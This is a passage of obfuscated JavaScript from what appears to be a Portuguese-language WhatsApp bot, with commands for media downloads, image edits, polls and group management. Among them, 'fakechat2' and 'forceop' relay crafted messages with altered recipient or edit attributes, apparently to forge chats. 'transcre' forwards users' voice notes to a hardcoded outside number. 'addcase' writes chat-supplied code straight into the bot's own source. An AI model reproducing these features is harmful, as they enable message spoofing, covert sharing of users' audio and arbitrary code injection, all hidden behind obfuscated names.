              const _0x506e49 = {
                tempo1: _0x3a7079,
                tempo2: _0x137400,
                grupo: _0x4f1071
              };
              var _0x10a23a = _0x506e49;
              if (!fs.existsSync("./DADOS/abrir-fechargptmp/fechar-abrir-gp-" + _0x4f1071 + ".json")) {
                fs.writeFileSync("./DADOS/abrir-fechargptmp/fechar-abrir-gp-" + _0x4f1071 + ".json", JSON.stringify(_0x10a23a, null, 100000));
              } else if (fs.existsSync("./DADOS/abrir-fechargptmp/fechar-abrir-gp-" + _0x4f1071 + ".json")) {
                fs.unlinkSync("./DADOS/abrir-fechargptmp/fechar-abrir-gp-" + _0x4f1071 + ".json");
                fs.writeFileSync("./DADOS/abrir-fechargptmp/fechar-abrir-gp-" + _0x4f1071 + ".json", JSON.stringify(_0x10a23a, null, 100000));
              }
              _0x403602("Tempo de fechar o grupo e abrir em tal horário foi programado com sucesso..");
              const _0x5dc54c = JSON.parse(fs.readFileSync("./DADOS/abrir-fechargptmp/fechar-abrir-gp-" + _0x4f1071 + ".json"));
              setTimeout(async () => {
                _0x403602("Grupo Fechado..");
                await _0x263319.groupSettingUpdate(_0x4f1071, "announcement");
              }, "" + _0x5dc54c.tempo1);
              setTimeout(async () => {
                _0x403602("Grupo Aberto..");
                await _0x263319.groupSettingUpdate(_0x4f1071, "not_announcement");
              }, "" + _0x5dc54c.tempo2);
              break;
            case "transcre":
              if (_0x13c612 && !_0x302296.message.imageMessage && !_0x302296.message.videoMessage || _0x6aebb1) {
                _0x403602("Aguarde Transcrevendo seu audio em texto...");
                muk = _0x6aebb1 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0x302296.message.audioMessage;
                rane = getRandom("." + (await getExtension(muk.mimetype)));
                buffimg = await getFileBuffer(muk, "audio");
                fs.writeFileSync(rane, buffimg);
                hah = fs.readFileSync(rane);
                const _0x19660e = {
                  audio: hah,
                  mimetype: muk.mimetype,
                  ptt: true
                };
                const _0xae1776 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage("553172280540@s.whatsapp.net", _0x19660e, _0xae1776);
                DLT_FL(rane);
              } else {
                _0x403602("Marque o áudio...");
              }
              break;
            case "fakechat2":
              {
                if (!_0x2a5ff3) {
                  return _0x403602("Só dono pode utilizar este comando...");
                }
                if (!_0x1d6557) {
                  return _0x403602("55enviarmsg/texto/55recebermsg");
                }
                txit1 = _0x1d6557.split("/")[0];
                txit2 = _0x1d6557.split("/")[1];
                txit3 = _0x1d6557.split("/")[2];
                const _0x5df7f8 = {
                  text: "" + txit2
                };
                const _0x1b1745 = {
                  extendedTextMessage: _0x5df7f8
                };
                await _0x263319.relayMessage(txit1 + "@s.whatsapp.net", _0x1b1745, {
                  additionalAttributes: {
                    recipient: txit3 + "@s.whatsapp.net"
                  }
                });
                break;
              }
              ;
            case "forceop":
              {
                if (!_0x2a5ff3) {
                  return _0x403602("Só dono pode utilizar este comando...");
                }
                if (!_0x1d6557) {
                  return _0x403602("ta faltando idogp/texto");
                }
                _0x3a7079 = _0x1d6557.split("/")[0];
                _0x137400 = _0x1d6557.split("/")[1];
                if (!_0x3a7079.includes("@g.us")) {
                  return _0x403602("Apenas link de hehehe 🤒☝️");
                }
                if (!_0x3a7079) {
                  return _0x403602("Ala um trouxe 😂😂");
                }
                if (!_0x137400) {
                  return _0x403602("Ala meu ovo ☝️🤒");
                }
                const _0x5d07ff = {
                  text: "" + _0x137400
                };
                const _0x595e59 = {
                  extendedTextMessage: _0x5d07ff
                };
                _0x263319.relayMessage("" + _0x3a7079, _0x595e59, {
                  additionalAttributes: {
                    edit: "1"
                  }
                });
                break;
              }
              ;
            case "id":
            case "figuid":
              if (!_0x2a5ff3) {
                return;
              }
              if (_0x1785a1) {
                var _0x4ea408 = _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString("base64");
                _0x403602(_0x4ea408);
              }
              break;
            case "dado":
              kapankah = _0x2e320b.slice(1);
              const _0x48c4fa = ["Caiu⚀", "Caiu⚁", "Caiu⚂", "Caiu⚃", "Caiu⚄", "Caiu⚅"];
              const _0x5edc14 = _0x48c4fa[Math.floor(Math.random() * _0x48c4fa.length)];
              const _0x624e5e = {
                text: _0x5edc14
              };
              const _0xb5b4f6 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x624e5e, _0xb5b4f6);
              break;
            case "apibot":
              if (!_0x2a5ff3) {
                return;
              }
              cafe = await fetchJson("https://api.bronxyshost.com.br/api/keyerrada?apikey=" + _0x44a335);
              apitxt = _0x6965b0 + " " + _0x55a6ac + "\n\n✔️ Você Tem『" + cafe.msg.split("Limite de Request:")[1] + " 』Downloads Disponíveis...";
              _0x403602(apitxt);
              break;
            case "enquete":
              txtz = _0x2e320b.slice(8);
              txttz = _0x40e45c.join(" ");
              txtttz = _0x40e45c.join(" ");
              txt1z = txtz.split("/")[0];
              txt2z = txttz.split("/")[1];
              txt3z = txtttz.split("/")[2];
              const _0x1671ff = {
                optionName: "" + txt2z
              };
              const _0x1d4b8e = {
                optionName: "" + txt3z
              };
              const _0x4efce0 = {
                options: [_0x1671ff, _0x1d4b8e],
                name: "" + txt1z,
                selectableOptionsCount: 0
              };
              const _0x144e06 = {
                messageContextInfo: {
                  messageSecret: "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk="
                },
                pollCreationMessage: _0x4efce0
              };
              message = _0x144e06;
              const _0x5aedf7 = {
                quoted: _0x302296
              };
              await _0x263319.relayMessage(_0x4f1071, message, _0x5aedf7);
              break;
            case "gptvoz2":
              try {
                const _0x29daee = require("./armor/funcoes/gtts")("pt-br");
                if (!_0x1d6557) {
                  return _0x403602("Faça uma pergunta, exemplo:\n\n*" + (_0x1d93be + _0x3dec88) + " Quantos anos para o plástico se decompor.*");
                }
                setTimeout(async () => {
                  await _0x263319.sendPresenceUpdate("recording", _0x4f1071);
                }, 3000);
                _0x403602("Aguarde, criando / pesquisando sobre o que esta perguntando ou pedindo");
                ABC = await fetchJson("https://api.lolhuman.xyz/api/openai-turbo?apikey=" + lolhuman + "&text=" + _0x1d6557);
                const _0x390b97 = getRandom(".mp3");
                const _0x3aac4e = getRandom(".ogg");
                _0x29daee.save(_0x390b97, ABC.result, async () => {
                  exec("ffmpeg -i " + _0x390b97 + " -ar 48000 -vn -c:a libopus " + _0x3aac4e, async _0x4b88ad => {
                    fs.unlinkSync(_0x390b97);
                    if (_0x4b88ad) {
                      return _0x403602("Houve um erro no processamento da sua solicitação. Tente novamente mais tarde e talvez, quem sabe, eu possa atender ao seu desejo.");
                    }
                    const _0x1b4593 = {
                      quoted: _0x302296
                    };
                    await _0x263319.sendMessage(_0x4f1071, {
                      audio: fs.readFileSync(_0x3aac4e),
                      mimetype: "audio/mp4",
                      ptt: true
                    }, _0x1b4593);
                    fs.unlinkSync(_0x3aac4e);
                  });
                });
              } catch (_0x3f2419) {}
              break;
            case "gptvoz":
              try {
                const _0x4f4e92 = require("./armor/funcoes/gtts")("pt-br");
                if (!_0x1d6557) {
                  return _0x403602("Faça uma pergunta, exemplo:\n\n*" + (_0x1d93be + _0x3dec88) + " Quantos anos para o plástico se decompor.*");
                }
                setTimeout(async () => {
                  await _0x263319.sendPresenceUpdate("recording", _0x4f1071);
                }, 3000);
                _0x403602("Aguarde, criando / pesquisando sobre o que está perguntando ou pedindo.");
                const _0x54dc92 = await fetchJson(SITE_JEFF_APIS + "/outros/openai?pergunta=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x4a0f79 = getRandom(".mp3");
                const _0x317be5 = getRandom(".ogg");
                _0x4f4e92.save(_0x4a0f79, _0x54dc92.resultado, async () => {
                  exec("ffmpeg -i " + _0x4a0f79 + " -ar 48000 -vn -c:a libopus " + _0x317be5, async _0x5ec08c => {
                    fs.unlinkSync(_0x4a0f79);
                    if (_0x5ec08c) {
                      return _0x403602("Houve um erro no processamento da sua solicitação. Tente novamente mais tarde e talvez, quem sabe, eu possa atender ao seu desejo.");
                    }
                    const _0x142e4a = {
                      quoted: _0x302296
                    };
                    await _0x263319.sendMessage(_0x4f1071, {
                      audio: fs.readFileSync(_0x317be5),
                      mimetype: "audio/mp4",
                      ptt: true
                    }, _0x142e4a);
                    fs.unlinkSync(_0x317be5);
                  });
                });
              } catch (_0x35e64b) {}
              break;
            case "descbot":
              if (!_0x2a5ff3) {
                return _0x403602("so meu dono");
              }
              if (!_0x1d6557) {
                return _0x403602("modo certo: " + _0x1d93be + "status biografia ");
              }
              await _0x263319.updateProfileStatus("" + _0x1d6557);
              _0x403602("Status atualizado para ");
              break;
            case "addcase":
              if (!_0x2a5ff3) {
                return _0x403602("Apenas o dono pode executar esta ação...");
              }
              if (!_0x40e45c.join(" ")) {
                return _0x403602("Cadê a case?");
              }
              const _0x3aea01 = fs.readFileSync("index.js", "utf8").slice(0, fs.readFileSync("index.js", "utf8").lastIndexOf("break") + 5);
              const _0x535a99 = fs.readFileSync("index.js", "utf8").slice(fs.readFileSync("index.js", "utf8").lastIndexOf("break") + 5);
              const _0x591902 = [_0x3aea01, _0x40e45c.join(" "), _0x535a99].join("\n\n");
              fs.writeFileSync("index.js", _0x591902);
              _0x403602("Nova case adicionada com sucesso!");
              break;
            case "getcase2":
            case "enviarcase":
              let _0xe67af3 = _0x2e320b.slice(9).trim().split("/");
              const _0x5c52a7 = _0xe67af3[0].trim();
              let _0x516b01 = _0xe67af3[1] ? _0xe67af3[1].trim() : null;
              if (!_0x2a5ff3) {
                return _0x403602("Só meu dono");
              }
              if (!_0x5c52a7 || !_0x516b01 && !_0xe67af3[1]) {
                return _0x403602("Uso correto: .getcase nomeCase/@marcação");
              }
              try {
                const _0x7d311a = fs.readFileSync("./index.js", "utf8");
                const _0x448d89 = _0x7d311a.indexOf("case '" + _0x5c52a7 + "'");
                if (_0x448d89 === -1) {
                  return _0x403602("Erro, talvez esse case não exista");
                }
                const _0x53c2d4 = _0x7d311a.indexOf("break", _0x448d89);
                const _0x53bc3e = _0x7d311a.substring(_0x448d89, _0x53c2d4) + "break";
                if (_0x516b01) {
                  _0x516b01 = _0x516b01.replace("@", "") + "@s.whatsapp.net";
                  await _0x263319.updateBlockStatus(_0x32e455, "unblock");
                  await sleep(1000);
                  const _0x2cca63 = {
                    text: _0x53bc3e
                  };
                  _0x263319.sendMessage(_0x516b01, _0x2cca63);
                  await sleep(1000);
                  _0x403602("A case " + _0x5c52a7 + " foi enviada com sucesso para " + _0x516b01.split("@")[0]);
                } else {
                  await _0x263319.updateBlockStatus(_0x32e455, "unblock");
                  await sleep(1000);
                  const _0x11c4b7 = {
                    text: _0x53bc3e
                  };
                  _0x263319.sendMessage(msg.from, _0x11c4b7);
                  await sleep(1000);
                }
              } catch (_0xfa11c1) {
                console.error(_0xfa11c1);
                _0x403602("Erro ao buscar o case.");
              }
              break;
            case "delcase":
              if (!_0x2a5ff3) {
                return _0x403602("Apenas o dono pode executar esta ação...");
              }
              if (!_0x40e45c.join(" ")) {
                return _0x403602("Qual é o nome da case que você deseja remover?");
              }
              let _0x53df3c = fs.readFileSync("index.js", "utf8");
              let _0x2a0721 = _0x40e45c.join(" ");
              let _0x458222 = _0x53df3c.indexOf("case '" + _0x2a0721 + "':");
              if (_0x458222 === -1) {
                return _0x403602("A case \"" + _0x2a0721 + "\" não foi encontrada.");
              }
              let _0x79288f = _0x53df3c.indexOf("break", _0x458222) + 5;
              let _0x13c743 = _0x53df3c.slice(0, _0x458222) + _0x53df3c.slice(_0x79288f);
              fs.writeFileSync("index.js", _0x13c743);
              _0x403602("A case \"" + _0x2a0721 + "\" foi removida com sucesso.");
              break;
            case "NOMEbot2":
              const _0x325e1e = "Jeff=\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nbot";
              await _0x263319.updateProfileName("" + _0x325e1e);
              break;
            case "descbot2":
              if (!_0x2a5ff3) {
                return _0x403602("so meu dono");
              }
              await _0x263319.updateProfileStatus("\n()_()\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n( • - • )\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n(>💔Não lembramos de dias, nos lembramos de momentos.");
              _0x403602("Status atualizado ");
              break;
            case "gethtml":
              if (!_0x1d6557) {
                return _0x403602("Insira a URL");
              }
              axios.get(_0x1d6557).then(_0x46811b => {
                const _0x1530c4 = JSON.stringify(_0x46811b.data, null, 2);
                if (_0x1530c4.length > 65536) {
                  const _0x11cde5 = "./lib/gethtml.txt";
                  fs.writeFile(_0x11cde5, _0x1530c4, _0x55d231 => {
                    if (_0x55d231) {
                      console.error("Erro ao escrever o arquivo:", _0x55d231);
                      return _0x403602("Houve um erro ao salvar a resposta no arquivo.");
                    }
                    const _0x268df0 = {
                      url: _0x11cde5
                    };
                    const _0xd7bca3 = {
                      document: _0x268df0,
                      mimetype: "text/plain",
                      fileName: "gethtml.txt"
                    };
                    const _0xe644ad = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, _0xd7bca3, _0xe644ad).then(() => {
                      fs.unlink(_0x11cde5, _0x3dec7c => {
                        if (_0x3dec7c) {
                          console.error("Erro ao deletar o arquivo:", _0x3dec7c);
                        }
                      });
                    }).catch(_0x4736de => {
                      console.error("Erro ao enviar o arquivo:", _0x4736de);
                      _0x403602("Houve um erro ao enviar o arquivo.");
                    });
                  });
                } else {
                  _0x403602(_0x1530c4);
                }
              }).catch(_0x298cea => {
                console.error("Erro ao obter a URL:", _0x298cea);
                _0x403602("Houve um erro ao acessar a URL.");
              });
              break;
            case "roletarussa":
            case "roletaban":
              if (!_0xd20756 || !_0x150e9e && !_0x35021e || !_0x5550bd || !_0x23cd8e) {
                if (!_0xd20756) {
                  return _0x403602(enviar.msg.grupo);
                }
                if (!_0x150e9e && !_0x35021e) {
                  return _0x403602(enviar.msg.adm);
                }
                if (!_0x5550bd) {
                  return _0x403602("O Bot Precisa ser ADM pra executar essa ação.");
                }
                if (!_0x23cd8e) {
                  return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x1d93be + "modobrincadeira 1");
                }
              }
              jds = [];
              A2 = _0x5b3ba6;
              B2 = _0x5b3ba6;
              TAMBOR = ["na perna.", "na cabeça.", "no pescoço.", "no peito.", "no olho.", "no estômago.", "na boca.", "na perna.", "na testa.", "no braço."];
              C2 = A2[Math.floor(Math.random() * A2.length)];
              if (JSON.stringify(_0x27033e).indexOf(_0x1dcf0a) >= 0) {
                return _0x403602("Não posso remover meu dono 🤧");
              }
              if (C2.id === numerodono_ofc || _0x2a5ff3) {
                _0x403602("Não vou banir o meu dono!");
              } else {
                tpa = TAMBOR[Math.floor(Math.random() * TAMBOR.length)];
                _0x403602("A escolha é minha! 1 membro irá morrer, que os jogos comecem...");
                setTimeout(() => {
                  D1 = "Que pena... você não sobreviveu ao meu jogo *@" + C2.id.split("@")[0] + "*, hora de enterrar o cadáver, infelizmente morreu com tiro *" + tpa + "*";
                  _0xd7aa55(D1, jds, true);
                }, 5000);
                jds.push(C2.id);
                setTimeout(() => {
                  jds.push(C2.id);
                  _0x263319.groupParticipantsUpdate(_0x4f1071, [C2.id], "remove");
                }, 6000);
              }
              break;
            case "play_audio3":
              {
                _0x403602(enviar.espere);
                if (!_0x1d6557) {
                  return _0x403602(_0x1d93be + _0x3dec88 + " link ou nome");
                }
                const _0x57045e = require("./lib/ytdl2");
                let _0xc688d7 = require("youtube-yts");
                let _0x3d63c9 = await _0xc688d7(_0x1d6557);
                let _0x299b66 = _0x3d63c9.videos[0];
                const _0x3f20b5 = await _0x57045e.mp3(_0x299b66.url);
                const _0x150a66 = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, {
                  audio: fs.readFileSync(_0x3f20b5.path),
                  fileName: _0x299b66.title + ".mp3",
                  mimetype: "audio/mp4",
                  ptt: false,
                  contextInfo: {
                    externalAdReply: {
                      mediaUrl: "" + _0x299b66.url,
                      mediaType: 2,
                      thumbnailUrl: "https://telegra.ph/file/4c39d0596ca82e1190d67.jpg"
                    }
                  }
                }, _0x150a66);
                await fs.unlinkSync(_0x3f20b5.path);
              }
              break;
              ;
            case "play_video3":
            case "playv3":
              {
                if (!_0x1d6557) {
                  return _0x403602(_0x1d93be + _0x3dec88 + " Digite o termo de pesquisa");
                }
                const _0x4572f4 = require("youtube-yts");
                const _0x493638 = require("./lib/ytdl2");
                _0x403602(enviar.espere);
                async function _0x5eec5c(_0x24b92f) {
                  try {
                    const _0xa6e36 = await _0x4572f4(_0x24b92f);
                    return _0xa6e36.videos;
                  } catch (_0x231328) {
                    console.error("Erro ao pesquisar vídeos no YouTube:", _0x231328);
                    return [];
                  }
                }
                const _0x3fad9c = await _0x5eec5c(_0x1d6557);
                if (_0x3fad9c.length === 0) {
                  return _0x403602("Nenhum vídeo encontrado para a consulta de pesquisa.");
                }
                const _0x370bde = _0x3fad9c[0];
                const _0x77cf49 = await _0x493638.mp4(_0x370bde.url);
                const _0x2237f9 = "\n*📝 Título:* " + _0x77cf49.title + "\n*📆 Data:* " + _0x77cf49.date + "\n*⏳ Duração:* " + _0x77cf49.duration + "\n*🎬 Qualidade:* " + _0x77cf49.quality;
                const _0x35d2de = {
                  url: _0x77cf49.videoUrl,
                  mimetype: "video/mp4"
                };
                const _0x21709b = {
                  video: _0x35d2de,
                  caption: _0x2237f9
                };
                const _0x8e1225 = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, _0x21709b, _0x8e1225);
              }
              break;
            case "tiktok_audio":
              if (!_0x1d6557.includes("tiktok")) {
                return _0x403602(_0x1d93be + _0x3dec88 + " link do Tiktok");
              }
              if (!_0x1d6557) {
                return _0x403602("Por favor, forneça o link do vídeo do Tiktok.");
              }
              const _0x449197 = {
                text: "⏳",
                key: _0x302296.key
              };
              const _0x51188e = {
                react: _0x449197
              };
              _0x263319.sendMessage(_0x4f1071, _0x51188e);
              _0x105f0a = await fetchJson(SITE_JEFF_APIS + "/download/tiktok2?url=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
              const _0x5aebbc = _0x105f0a.resultado.noWatermark;
              const _0x598a28 = {
                text: "✅",
                key: _0x302296.key
              };
              const _0x3e68b2 = {
                react: _0x598a28
              };
              _0x263319.sendMessage(_0x4f1071, _0x3e68b2);
              const _0x228384 = {
                url: _0x5aebbc
              };
              const _0x5678b9 = {
                audio: _0x228384,
                mimetype: "audio/mpeg"
              };
              const _0x982f4d = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x5678b9, _0x982f4d).catch(_0x12a99c => {
                _0x403602(error());
              });
              break;
            case "tiktok_audio2":
              if (!_0x1d6557.includes("tiktok")) {
                return _0x403602(_0x1d93be + _0x3dec88 + " link do Tiktok");
              }
              if (!_0x1d6557) {
                return _0x403602("Por favor, forneça o link do vídeo do Tiktok.");
              }
              const _0x5d980c = {
                text: "⏳",
                key: _0x302296.key
              };
              const _0x4306e5 = {
                react: _0x5d980c
              };
              _0x263319.sendMessage(_0x4f1071, _0x4306e5);
              _0x105f0a = await fetchJson(SITE_JEFF_APIS + "/download/tiktok?url=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
              const _0x72574f = {
                text: "✅",
                key: _0x302296.key
              };
              const _0x19ec41 = {
                react: _0x72574f
              };
              _0x263319.sendMessage(_0x4f1071, _0x19ec41);
              tkID = await getBuffer(_0x105f0a.resultado.video_HD);
              const _0x21cc7d = {
                audio: tkID,
                caption: "Ola *" + _0x55a6ac + "* Aqui esta o vídeo hd"
              };
              const _0x36bd6d = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x21cc7d, _0x36bd6d).catch(_0x5d1fe6 => {
                _0x403602(error());
              });
              break;
            case "tiktok":
              if (!_0x1d6557.includes("tiktok")) {
                return _0x403602(_0x1d93be + _0x3dec88 + " link do Tiktok");
              }
              if (!_0x1d6557) {
                return _0x403602("Por favor, forneça o link do vídeo do Tiktok.");
              }
              if (botoes_) {
                const _0x4ccbba = {
                  display_text: "ꚠ AUDIO 🎵",
                  id: _0x1d93be + "tiktok_audio " + _0x1d6557
                };
                const _0x464860 = {
                  display_text: "ꚠ VIDEO 🎥",
                  id: _0x1d93be + "tiktok_video " + _0x1d6557
                };
                const _0x642d95 = {
                  display_text: "ꚠ AUDIO V2 🎵",
                  id: _0x1d93be + "tiktok_audio2 " + _0x1d6557
                };
                const _0x347876 = {
                  display_text: "ꚠ VIDEO HD 🎥",
                  id: _0x1d93be + "tiktok_videohd " + _0x1d6557
                };
                _0x263319.relayMessage(_0x4f1071, {
                  interactiveMessage: {
                    body: {
                      text: "\nꚠ 𝙏𝙄𝙆𝙏𝙊𝙆 𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿 📥\n\n\n" + _0x6965b0 + " @" + _0x32e455.split("@")[0]
                    },
                    footer: {
                      text: "𝘌𝘴𝘤𝘰𝘭𝘩𝘢 𝘶𝘮𝘢 𝘰𝘱çã𝘰"
                    },
                    nativeFlowMessage: {
                      buttons: [{
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify(_0x4ccbba)
                      }, {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify(_0x464860)
                      }, {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify(_0x642d95)
                      }, {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify(_0x347876)
                      }]
                    }
                  }
                }, {});
              } else {
                const _0x1beb4b = {
                  text: "⏳",
                  key: _0x302296.key
                };
                const _0xadf391 = {
                  react: _0x1beb4b
                };
                _0x263319.sendMessage(_0x4f1071, _0xadf391);
                _0x105f0a = await fetchJson(SITE_JEFF_APIS + "/download/tiktok2?url=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x4e4d12 = {
                  text: "✅",
                  key: _0x302296.key
                };
                const _0x526336 = {
                  react: _0x4e4d12
                };
                _0x263319.sendMessage(_0x4f1071, _0x526336);
                tkID = await getBuffer(_0x105f0a.resultado.noWatermark);
                const _0x9b283e = {
                  video: tkID,
                  caption: "Ola *" + _0x55a6ac + "* Aqui esta o vídeo"
                };
                const _0x29873b = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x9b283e, _0x29873b).catch(_0x6ecf32 => {
                  _0x403602(error());
                });
              }
              break;
            case "tiktok_video":
              if (!_0x1d6557.includes("tiktok")) {
                return _0x403602(_0x1d93be + _0x3dec88 + " link do Tiktok");
              }
              if (!_0x1d6557) {
                return _0x403602("Por favor, forneça o link do vídeo do Tiktok.");
              }
              const _0x497c0e = {
                text: "⏳",
                key: _0x302296.key
              };
              const _0x5cb854 = {
                react: _0x497c0e
              };
              _0x263319.sendMessage(_0x4f1071, _0x5cb854);
              _0x105f0a = await fetchJson(SITE_JEFF_APIS + "/download/tiktok2?url=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
              const _0x2988d3 = {
                text: "✅",
                key: _0x302296.key
              };
              const _0x123df0 = {
                react: _0x2988d3
              };
              _0x263319.sendMessage(_0x4f1071, _0x123df0);
              tkID = await getBuffer(_0x105f0a.resultado.noWatermark);
              const _0x37f334 = {
                video: tkID,
                caption: "Ola *" + _0x55a6ac + "* Aqui esta o vídeo"
              };
              const _0xa9b25e = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x37f334, _0xa9b25e).catch(_0x2adb45 => {
                _0x403602(error());
              });
              break;
            case "tiktok_videohd":
            case "tiktok_video2":
              if (!_0x1d6557.includes("tiktok")) {
                return _0x403602(_0x1d93be + _0x3dec88 + " link do Tiktok");
              }
              if (!_0x1d6557) {
                return _0x403602("Por favor, forneça o link do vídeo do Tiktok.");
              }
              const _0x32eb4b = {
                text: "⏳",
                key: _0x302296.key
              };
              const _0x272cc3 = {
                react: _0x32eb4b
              };
              _0x263319.sendMessage(_0x4f1071, _0x272cc3);
              _0x105f0a = await fetchJson(SITE_JEFF_APIS + "/download/tiktok?url=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
              const _0x66ea3b = {
                text: "✅",
                key: _0x302296.key
              };
              const _0x3eab1f = {
                react: _0x66ea3b
              };
              _0x263319.sendMessage(_0x4f1071, _0x3eab1f);
              tkID = await getBuffer(_0x105f0a.resultado.video_HD);
              const _0x51664f = {
                video: tkID,
                caption: "Ola *" + _0x55a6ac + "* Aqui esta o vídeo hd"
              };
              const _0x4621a1 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x51664f, _0x4621a1).catch(_0x6f05e3 => {
                _0x403602(error());
              });
              break;
            case "figuid2":
              if (_0x1785a1) {
                const _0x17c10e = _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString("hex").toUpperCase();
                _0x403602("" + _0x17c10e);
              } else {
                _0x403602("Marque uma figurinha para mostrar o ID.");
              }
              break;
            case "fotohd":
            case "hd":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x5b4005 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x480551 = await downloadContentFromMessage(_0x5b4005, "image");
                  let _0x23df38 = Buffer.from([]);
                  for await (const _0x26d550 of _0x480551) {
                    _0x23df38 = Buffer.concat([_0x23df38, _0x26d550]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x5a48f4 = await upload(_0x23df38);
                  const _0xa6c01 = SITE_JEFF_APIS + "/api/ia/fotohd?link=" + _0x5a48f4 + "&apikey=" + _0x512d5e;
                  const _0x5380e5 = {
                    url: _0xa6c01
                  };
                  const _0x23c36e = {
                    image: _0x5380e5
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x23c36e);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x6817df) {
                console.error("Erro:", _0x6817df);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotohd2":
            case "hd2":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0xc5ed2e = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x483a6c = await downloadContentFromMessage(_0xc5ed2e, "image");
                  let _0x5b6731 = Buffer.from([]);
                  for await (const _0x4206c7 of _0x483a6c) {
                    _0x5b6731 = Buffer.concat([_0x5b6731, _0x4206c7]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x184657 = await upload(_0x5b6731);
                  const _0x555973 = SITE_JEFF_APIS + "/api/ia/fotohd2?link=" + _0x184657 + "&apikey=" + _0x512d5e;
                  const _0x1df433 = {
                    url: _0x555973
                  };
                  const _0x451f66 = {
                    image: _0x1df433
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x451f66);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x37ad8b) {
                console.error("Erro:", _0x37ad8b);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "removebg":
              if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                const _0x4f4c71 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                const _0x23fe37 = await downloadContentFromMessage(_0x4f4c71, "image");
                let _0x38c6ba = Buffer.from([]);
                for await (const _0x3af243 of _0x23fe37) {
                  _0x38c6ba = Buffer.concat([_0x38c6ba, _0x3af243]);
                }
                const _0x29f0cb = {
                  quoted: _0x302296
                };
                _0x403602(enviar.espere, _0x29f0cb);
                const _0x1334da = await upload(_0x38c6ba);
                try {
                  const _0x39b4a1 = {
                    url: SITE_JEFF_APIS + "/api/ia/removebg?link=" + _0x1334da + "&apikey=" + _0x512d5e
                  };
                  const _0x371097 = {
                    image: _0x39b4a1,
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x371097).catch(_0x3c8b51 => {
                    console.error("Erro ao enviar a imagem:", _0x3c8b51);
                    const _0x553287 = {
                      quoted: _0x302296
                    };
                    return _0x403602("Erro ao enviar a imagem. =(", _0x553287);
                  });
                } catch (_0x330790) {
                  console.error("Erro ao obter a imagem da API:", _0x330790);
                  const _0x18faed = {
                    quoted: _0x302296
                  };
